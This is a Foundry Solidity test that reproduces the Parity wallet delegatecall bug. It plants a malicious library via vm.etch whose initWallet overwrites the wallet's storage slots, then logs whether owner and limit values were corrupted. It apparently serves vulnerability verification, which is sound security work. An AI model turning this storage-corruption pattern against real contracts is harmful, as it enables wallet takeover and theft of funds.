// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_1.sol";

contract MaliciousWalletLibrary {
    function initWallet(address[] calldata, uint, uint) public {
        assembly {
            sstore(0, 0xCAFEB0B0)
            sstore(12345, 0xBAD)
        }
    }
}

contract WalletDelegatecallTest is Test {
    address constant WALLET_LIB = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;
    Wallet public wallet;
    
    function test_delegatecall_compromises_storage() public {
        // Expected state values
        uint256 expectedNumOwners = 2;
        uint256 expectedRequired = 2;
        uint256 expectedDailyLimit = 100;
        
        console.log("--- BEFORE-TRIGGER: Expected State ---");
        console.log("Expected m_numOwners():", expectedNumOwners);
        console.log("Expected m_required():", expectedRequired);
        console.log("Expected m_dailyLimit():", expectedDailyLimit);
        
        // Create and setup malicious library
        MaliciousWalletLibrary maliciousLib = new MaliciousWalletLibrary();
        vm.etch(WALLET_LIB, address(maliciousLib).code);
        
        // Initialize params
        address[] memory owners = new address[](2);
        owners[0] = address(0x1);
        owners[1] = address(0x2);
        
        console.log("--- TRIGGER ACTION: Deploy wallet ---");
        wallet = new Wallet(owners, expectedRequired, expectedDailyLimit);
        
        console.log("--- AFTER-TRIGGER: Actual State ---");
        uint256 actualNumOwners = wallet.m_numOwners();
        uint256 actualRequired = wallet.m_required();
        uint256 actualDailyLimit = wallet.m_dailyLimit();

        console.log("Actual m_numOwners():", actualNumOwners);
        console.log("Actual m_required():", actualRequired);
        console.log("Actual m_dailyLimit():", actualDailyLimit);
        
        // Compare states
        bool stateCorrupted = (actualNumOwners != expectedNumOwners) || 
                             (actualRequired != expectedRequired) ||
                             (actualDailyLimit != expectedDailyLimit);
        
        console.log("--- STATE COMPARISON ---");
        console.log("Storage corruption detected:", stateCorrupted ? "YES" : "NO");
        
        // Storage slot verification (additional proof)
        bytes32 slot0 = vm.load(address(wallet), bytes32(0));
        bytes32 slot12345 = vm.load(address(wallet), bytes32(uint256(12345)));
        console.log("Storage slot0:", uint256(slot0));
        console.log("Storage slot12345:", uint256(slot12345));
        
        // Final vulnerability verdict
        if (stateCorrupted) {
            console.log("Vulnerability Exists: Wallet storage corrupted via malicious delegatecall");
        } else {
            console.log("Vulnerability not Exist: Wallet state remains uncorrupted");
        }
    }
}